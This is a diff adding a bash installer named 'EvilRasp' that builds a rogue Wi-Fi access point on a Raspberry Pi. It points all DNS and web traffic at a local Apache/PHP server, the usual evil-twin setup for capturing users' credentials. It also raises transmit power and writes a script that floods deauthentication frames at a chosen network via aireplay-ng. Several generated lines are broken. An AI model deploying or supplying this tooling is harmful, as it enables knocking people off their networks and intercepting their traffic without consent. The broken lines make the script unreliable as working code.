@@ -1,0 +1,102 @@
+#!/bin/bash
+# EvilRasp
+# Gabriel Haab, Jan 2018
+
+# ===== Check Sudo =======
+
+if [ $(id -u) != "0" ]; then
+    echo "You need to be root to run this installer, try:\nsudo ./EvilRasp"
+echo "\n"
+    exit 1
+fi
+
+# ========================
+
+apt update 
+apt install hostapd dnsmasq dhcpcd5 apache2 php 
+
+echo "interface wlan0" >> /etc/dhcpcd.conf
+echo "static ip_address=192.168.4.1/24" >> /etc/dhcpcd.conf
+echo "/etc/dhcpcd.conf done"
+
+echo "interface=wlan0" >> /etc/dnsmasq.conf
+echo "dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,24h" >> /etc/dnsmasq.conf
+echo "" >> /etc/dnsmasq.conf
+echo "" >> /etc/dnsmasq.conf
+echo "address=/#/192.168.4.1" >> /etc/dnsmasq.conf
+echo "server=/google.com/#" >> /etc/dnsmasq.conf
+
+
+echo "/etc/dnsmasq.conf done"
+
+echo "What's the wireless name?"
+read -r ssid
+echo "What's the channel?"
+read -r ch
+
+echo "interface=wlan0" > /etc/hostapd/hostapd.conf
+echo "driver=nl80211" >> /etc/hostapd/hostapd.conf
+echo "ssid=$ssid" >> /etc/hostapd/hostapd.conf
+echo "hw_mode=g" >> /etc/hostapd/hostapd.conf
+echo "channel=$ch" >> /etc/hostapd/hostapd.conf
+
+echo 'DAEMON_CONF="/etc/hostapd/hostapd.conf"' >> /etc/default/hostapd
+
+iptables -t nat -A PREROUTING -d 0/0 -p tcp --dport 80 -j DNAT --to-destination 192.168.4.1:80
+
+iptables-save > /etc/firewall.conf
+
+echo "#!/bin/sh -e" > /etc/rc.local
+echo "iptables-restore < /etc/firewall.conf" >> /etc/rc.local
+echo "iw dev wlan0 set txpower fixed 30mBm" >> /etc/rc.local
+echo "exit 0" >> /etc/rc.local
+
+chmod a+x /etc/rc.local
+
+service dhcpcd restart
+service hostapd start 
+service dnsmasq start 
+
+systemctl enable ssh
+systemctl enable hostapd 
+systemctl enable dnsmasq
+systemctl enable dhcpcd 
+
+echo "Thanks! Done!"
+
+#============== create script to deauth ============= 
+
+echo "#!/bin/bash" > /root/deauth
+echo "wlan1=`iw dev | cut -d ' ' -f 2 | grep wlan1`" >> /root/deauth
+echo 'if [ "$wlan1" = "wlan1" ]; then ' >> /root/deauth
+echo "mon0=`iw dev | cut -d ' ' -f 2 | grep mon0`" >> /root/deauth
+echo 'if [ ! "$mon0" = "mon0" ]; then ' >> /root/deauth
+echo "ifconfig wlan1 down" >> /root/deauth
+echo "iw dev wlan1 interface add mon0 type monitor" >> /root/deauth
+echo "ifconfig mon0 down " >> /root/deauth
+echo "iwconfig mon0 mode monitor" >> /root/deauth
+echo "ifconfig mon0 up" >> /root/deauth
+echo 'echo "mon0 interface created"' >> /root/deauth
+echo "fi" >> /root/deauth
+
+echo "select SSID in `iw dev wlan1 scan | grep SSID`; do" >> /root/deauth
+
+echo "if [$SSID];then" >> /root/deauth
+	break" >> /root/deauth
+echo "else" >> /root/deauth
+echo "echo 'Select the number next to the SSID'" >> /root/deauth
+echo "fi" >> /root/deauth
+echo "done" >> /root/deauth
+
+echo "mac = `iw dev wlan1 scan | grep -B 10 SSID | grep BSS | cut -d ' ' -f 2 | cut -d '(' -f 1`" >> /root/deauth
+
+echo "wlan1 set txpower fixed 30mBm" >> /root/deauth
+echo "aireplay-ng -0 100 -a $mac mon0 --ignore-negative-one" >> /root/deauth
+
+echo "ifconfig mon0 down" >> /root/deauth
+echo "iw dev mon0 del" >> /root/deauth
+echo "iwconfig wlan1 mode managed" >> /root/deauth
+echo "ifconfig wlan1 up" >> /root/deauth
+echo "Done building the deauth script!"
+
+# ======================================================== 
